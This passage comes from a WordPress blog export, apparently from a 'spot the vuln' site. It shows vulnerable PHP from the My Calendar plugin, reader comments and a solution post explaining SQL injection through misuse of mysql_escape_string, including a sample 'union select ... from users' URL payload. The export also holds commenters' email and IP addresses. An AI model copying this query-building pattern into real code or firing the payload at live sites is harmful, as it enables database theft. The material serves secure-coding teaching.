				<td><legend><?php _e('Category Name','calendar'); ?>:</legend></td>
                                <td><input type="text" name="category_name" class="input" size="30" maxlength="30" value="<?php echo stripslashes($cur_cat->category_name) ?>" /></td>
				</tr>
                                <tr>
				<td><legend><?php _e('Category Colour (Hex format)','calendar'); ?>:</legend></td>
                                <td><input type="text" name="category_colour" class="input" size="10" maxlength="7" value="<?php echo stripslashes($cur_cat->category_colour) ?>" /></td>
                                </tr>
                                </table>
                        </div>
                        <div style="clear:both; height:1px;">&nbsp;</div>
                </div>
                <input type="submit" name="save" class="button bold" value="<?php _e('Save','calendar'); ?> &raquo;" />
    </form>
</div>
      <?php
    }
  else if (isset($_POST['mode']) && isset($_POST['category_id']) && isset($_POST['category_name']) && isset($_POST['category_colour']) && $_POST['mode'] == 'edit')
    {
      // Proceed with the save
      $sql = "UPDATE " . WP_CALENDAR_CATEGORIES_TABLE . " SET category_name='".mysql_escape_string($_POST['category_name'])."', category_colour='".mysql_escape_string($_POST['category_colour'])."' WHERE category_id=".mysql_escape_string($_POST['category_id']);
      $wpdb->get_results($sql);
      echo "<div class=\"updated\"><p><strong>".__('Category edited successfully','calendar')."</strong></p></div>";
    }

  $get_mode = 0;
  $post_mode = 0;
  if (isset($_GET['mode'])) {
    if ($_GET['mode'] == 'edit') {
      $get_mode = 1;
    }
  }
  if (isset($_POST['mode'])) {
    if ($_POST['mode'] == 'edit') {
      $post_mode = 1;
    }
  }
  if ($get_mode != 1 || $post_mode == 1)
    {
?>

  <div class="wrap">
    <h2><?php _e('Add Category','calendar'); ?></h2>
    <form name="catform" id="catform" class="wrap" method="post" action="<?php echo bloginfo('wpurl'); ?>/wp-admin/admin.php?page=calendar-categories">
                <input type="hidden" name="mode" value="add" />
                <input type="hidden" name="category_id" value="">
                <div id="linkadvanceddiv" class="postbox">
                        <div style="float: left; width: 98%; clear: both;" class="inside">
       				<table cellspacing="5" cellpadding="5">
                                <tr>
                                <td><legend><?php _e('Category Name','calendar'); ?>:</legend></td>
                                <td><input type="text" name="category_name" class="input" size="30" maxlength="30" value="" /></td>
                                </tr>
                                <tr>
                                <td><legend><?php _e('Category Colour (Hex format)','calendar'); ?>:</legend></td>
                                <td><input type="text" name="category_colour" class="input" size="10" maxlength="7" value="" /></td>
                                </tr>
                                </table>
                        </div>
		        <div style="clear:both; height:1px;">&nbsp;</div>
                </div>
                <input type="submit" name="save" class="button bold" value="<?php _e('Save','calendar'); ?> &raquo;" />
    </form>
    <h2><?php _e('Manage Categories','calendar'); ?></h2>
...snip...
</code>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1572</wp:post_id>
		<wp:post_date>2011-08-01 22:19:33</wp:post_date>
		<wp:post_date_gmt>2011-08-02 05:19:33</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>boundaries</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>2151</wp:comment_id>
			<wp:comment_author><![CDATA[Christina]]></wp:comment_author>
			<wp:comment_author_email>cmiller18b@gmail.com</wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP>209.131.212.178</wp:comment_author_IP>
			<wp:comment_date>2011-08-05 13:30:10</wp:comment_date>
			<wp:comment_date_gmt>2011-08-05 20:30:10</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[I just realised something about this.  If mysql_escape_string doesn't escape the % character, would that allow us to put in something like, say, %22 for a double-quote character?  It would be the same as with some URLs having %20 in place of a space character, wouldn't it? Or would that work with this?  Just a thought.]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:14:"1312576210.997";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1312826808.9775";s:7:"message";s:45:"bkrios changed the comment status to approved";s:5:"event";s:15:"status-approved";s:4:"user";s:6:"bkrios";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
		<wp:comment>
			<wp:comment_id>2150</wp:comment_id>
			<wp:comment_author><![CDATA[Christina]]></wp:comment_author>
			<wp:comment_author_email>cmiller18b@gmail.com</wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP>209.131.212.178</wp:comment_author_IP>
			<wp:comment_date>2011-08-05 10:36:45</wp:comment_date>
			<wp:comment_date_gmt>2011-08-05 17:36:45</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[Wow, this one is tougher.  The only thing I can see, aside from not knowing where some of the variables are defined, is that the coder uses mysql_escape_string, which has a great big red danger sign on the documentation page saying that it's deprecated.  It doesn't escape % or _.  Does this open us up to injection?  It also says that the new function escapes according to the current character set.

Can WP_CALENDAR_CATEGORIES_TABLE or WP_CALENDAR_TABLE be changed by an attacker? I'm sort of assuming not, but assuming can get one in trouble. :)

If they can be, though, then it could be an SQL injection.

Related to SQL injection, but not to this particular code: Would it completely eliminate SQL vulnerabilities to use a function that sanitises inclusively instead of exclusively? For example, instead of looking for specific characters to escape, it woulde escape everything not on a "whitelist" of allowable characters - or scold the user if they try to use anything other than what we want them to use, say letters and numbers only.  It could limit globalisation, but it would be more secure.  Just an idea.]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1312565806.7782";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1312826814.3454";s:7:"message";s:45:"bkrios changed the comment status to approved";s:5:"event";s:15:"status-approved";s:4:"user";s:6:"bkrios";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
		<wp:comment>
			<wp:comment_id>2147</wp:comment_id>
			<wp:comment_author><![CDATA[Jon Zobrist]]></wp:comment_author>
			<wp:comment_author_email>jon@jonzobrist.com</wp:comment_author_email>
			<wp:comment_author_url>http://jonzobrist.com</wp:comment_author_url>
			<wp:comment_author_IP>174.52.58.123</wp:comment_author_IP>
			<wp:comment_date>2011-08-01 22:51:43</wp:comment_date>
			<wp:comment_date_gmt>2011-08-02 05:51:43</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[Rampant use of deprecated function mysql_escape_string() which "does not escape % and _" according to the linked man page. Especially bad is that % which is MySQL wildcard.
Any of the queries passed directly to MySQL with this could result in rampantly bad behavior...
WHERE category_id=".mysql_escape_string($_POST['category_id']);
If $_POST['category_id'] where say iterated from 0% ... 9%]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1312264303.2999";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1312826813.1601";s:7:"message";s:45:"bkrios changed the comment status to approved";s:5:"event";s:15:"status-approved";s:4:"user";s:6:"bkrios";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
	</item>
	<item>
		<title>Boundaries - SQL Injection</title>
		<link>http://spotthevuln.com/2011/08/boundaries-sql-injection/</link>
		<pubDate>Mon, 08 Aug 2011 18:15:49 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1575</guid>
		<description></description>
		<content:encoded><![CDATA[<h1>Details</h1>
Affected Software: My Calendar Wordpress Plugin

Fixed in Version: >1.7.2

Issue Type: SQL Injection

Original Code: <a href="http://spotthevuln.com/2011/08/boundaries/">Found Here</a>
<h1>Details</h1>
This week’s bug was a subtle mistake in the usage of an escaping routine.  It seems the developer understood the dangers of SQL injection and therefore used an escaping routine to sanitize user controlled input before using that input to build a SQL statement.  Unfortunately, the developer overlooked a crucial characteristic and used the wrong escaping routine.  Looking at the vulnerable line, we see the following:
<code lang="PHP">
$sql = "SELECT * FROM " . WP_CALENDAR_CATEGORIES_TABLE . " WHERE category_id=".mysql_escape_string($_GET['category_id']);
</code>
As you can clearly see, the developer chose to utilize the mysql_escape_string() function to escape $_GET[‘category_id] before using category_id to build a SQL statement.  Looking at the documentation (http://php.net/manual/en/function.mysql-escape-string.php) for mysql_escape_string(), we see that the specific characters escaped are: null byte (0), newline (\n), carriage return (\r), backslash (\), single quote ('), double quote (") and substiture (SUB, or \032).  In this case, none of these characters are required in order for SQL injection to be successful.  The user controlled $_GET[‘category_id’] is not enclosed in quotes, so there is no need to break out of quotes for SQL injection.  For example, the attacker can pass the following:

http://path-to-server/calendar.php? category_id=1%20union%20select%201,2,3,4,5,6%20from%20users;

This would result in the following SQL statement:
SELECT * FROM WP_CALENDAR_CATEGORIES_TABLE WHERE category_id=1 union select 1,2,3,4,5,6 from users;

As you can see, the attacker can craft a valid SQL injection without using any of the characters escaped by mysql_escape_string().  The developers addressed this issue by casting the $_GET[‘category_id’] to an int before using it in a SQL statement.

If you look closely... you'll see other, unpatched SQL injections with the same symptom littered throughout the code...

<h1>Vulnerable Code</h1>
<code lang="PHP" highlight="23">
...snip...
     
</style>
<?php
  // We do some checking to see what we're doing
  if (isset($_POST['mode']) && $_POST['mode'] == 'add')
    {
      // Proceed with the save  
      $sql = "INSERT INTO " . WP_CALENDAR_CATEGORIES_TABLE . " SET category_name='".mysql_escape_string($_POST['category_name'])."', category_colour='".mysql_escape_string($_POST['category_colour'])."'";
      $wpdb->get_results($sql);
      echo "<div class=\"updated\"><p><strong>".__('Category added successfully','calendar')."</strong></p></div>";
    }
  else if (isset($_GET['mode']) && isset($_GET['category_id']) && $_GET['mode'] == 'delete')
    {
      $sql = "DELETE FROM " . WP_CALENDAR_CATEGORIES_TABLE . " WHERE category_id=".mysql_escape_string($_GET['category_id']);
      $wpdb->get_results($sql);
      $sql = "UPDATE " . WP_CALENDAR_TABLE . " SET event_category=1 WHERE event_category=".mysql_escape_string($_GET['category_id']);
      $wpdb->get_results($sql);
      echo "<div class=\"updated\"><p><strong>".__('Category deleted successfully','calendar')."</strong></p></div>";
    }
  else if (isset($_GET['mode']) && isset($_GET['category_id']) && $_GET['mode'] == 'edit' && !isset($_POST['mode']))
    {
      $sql = "SELECT * FROM " . WP_CALENDAR_CATEGORIES_TABLE . " WHERE category_id=".mysql_escape_string($_GET['category_id']);
      $cur_cat = $wpdb->get_row($sql);
      ?>
<div class="wrap">
   <h2><?php _e('Edit Category','calendar'); ?></h2>
    <form name="catform" id="catform" class="wrap" method="post" action="<?php echo bloginfo('wpurl'); ?>/wp-admin/admin.php?page=calendar-categories">
                <input type="hidden" name="mode" value="edit" />
                <input type="hidden" name="category_id" value="<?php echo stripslashes($cur_cat->category_id) ?>" />
                <div id="linkadvanceddiv" class="postbox">
                        <div style="float: left; width: 98%; clear: both;" class="inside">
				<table cellpadding="5" cellspacing="5">
                                <tr>
				<td><legend><?php _e('Category Name','calendar'); ?>:</legend></td>
                                <td><input type="text" name="category_name" class="input" size="30" maxlength="30" value="<?php echo stripslashes($cur_cat->category_name) ?>" /></td>
				</tr>
                                <tr>
				<td><legend><?php _e('Category Colour (Hex format)','calendar'); ?>:</legend></td>
                                <td><input type="text" name="category_colour" class="input" size="10" maxlength="7" value="<?php echo stripslashes($cur_cat->category_colour) ?>" /></td>
                                </tr>
                                </table>
                        </div>
                        <div style="clear:both; height:1px;">&nbsp;</div>
                </div>
                <input type="submit" name="save" class="button bold" value="<?php _e('Save','calendar'); ?> &raquo;" />
    </form>
</div>
      <?php
    }
  else if (isset($_POST['mode']) && isset($_POST['category_id']) && isset($_POST['category_name']) && isset($_POST['category_colour']) && $_POST['mode'] == 'edit')
    {
      // Proceed with the save
      $sql = "UPDATE " . WP_CALENDAR_CATEGORIES_TABLE . " SET category_name='".mysql_escape_string($_POST['category_name'])."', category_colour='".mysql_escape_string($_POST['category_colour'])."' WHERE category_id=".mysql_escape_string($_POST['category_id']);
      $wpdb->get_results($sql);
      echo "<div class=\"updated\"><p><strong>".__('Category edited successfully','calendar')."</strong></p></div>";
    }

  $get_mode = 0;
  $post_mode = 0;
  if (isset($_GET['mode'])) {
    if ($_GET['mode'] == 'edit') {
      $get_mode = 1;
    }
  }
  if (isset($_POST['mode'])) {
    if ($_POST['mode'] == 'edit') {
      $post_mode = 1;
    }
  }
  if ($get_mode != 1 || $post_mode == 1)
    {
?>

  <div class="wrap">
    <h2><?php _e('Add Category','calendar'); ?></h2>
    <form name="catform" id="catform" class="wrap" method="post" action="<?php echo bloginfo('wpurl'); ?>/wp-admin/admin.php?page=calendar-categories">
                <input type="hidden" name="mode" value="add" />
                <input type="hidden" name="category_id" value="">
                <div id="linkadvanceddiv" class="postbox">
                        <div style="float: left; width: 98%; clear: both;" class="inside">
       				<table cellspacing="5" cellpadding="5">
                                <tr>
                                <td><legend><?php _e('Category Name','calendar'); ?>:</legend></td>
                                <td><input type="text" name="category_name" class="input" size="30" maxlength="30" value="" /></td>
                                </tr>
                                <tr>
                                <td><legend><?php _e('Category Colour (Hex format)','calendar'); ?>:</legend></td>
                                <td><input type="text" name="category_colour" class="input" size="10" maxlength="7" value="" /></td>
                                </tr>
                                </table>
                        </div>
		        <div style="clear:both; height:1px;">&nbsp;</div>
                </div>
                <input type="submit" name="save" class="button bold" value="<?php _e('Save','calendar'); ?> &raquo;" />
    </form>
    <h2><?php _e('Manage Categories','calendar'); ?></h2>
</code>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1575</wp:post_id>
		<wp:post_date>2011-08-08 11:15:49</wp:post_date>
		<wp:post_date_gmt>2011-08-08 18:15:49</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>boundaries-sql-injection</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<category domain="category" nicename="sql-injection"><![CDATA[SQL Injection]]></category>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>2189</wp:comment_id>
			<wp:comment_author><![CDATA[Henri Salo]]></wp:comment_author>
			<wp:comment_author_email>henri@nerv.fi</wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP>83.150.91.157</wp:comment_author_IP>
			<wp:comment_date>2012-04-05 23:59:12</wp:comment_date>
			<wp:comment_date_gmt>2012-04-06 06:59:12</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[Have you reported vulnerabilities you have found to the developer of this plugin? I can also coordinate this if you are busy. This also does need CVE-identifier if this yet doesn't have one. Please contact me via my email thank you!]]></wp:comment_content>
			<wp:comment_approved>0</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1333695552.4866";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
		<wp:comment>
			<wp:comment_id>2155</wp:comment_id>
			<wp:comment_author><![CDATA[matt cool]]></wp:comment_author>
			<wp:comment_author_email>mattz@mail.com</wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP>92.18.63.27</wp:comment_author_IP>
			<wp:comment_date>2011-08-10 07:54:18</wp:comment_date>
			<wp:comment_date_gmt>2011-08-10 14:54:18</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[Is there also a XSRF here? 

 else if (isset($_GET['mode']) &amp;&amp; isset($_GET['category_id']) &amp;&amp; $_GET['mode'] == 'delete')

Thanks,
Matt]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1319567558.8108";s:7:"message";s:45:"BrettH changed the comment status to approved";s:5:"event";s:15:"status-approved";s:4:"user";s:6:"BrettH";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:14:"1312988058.845";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
	</item>
</channel>
</rss>
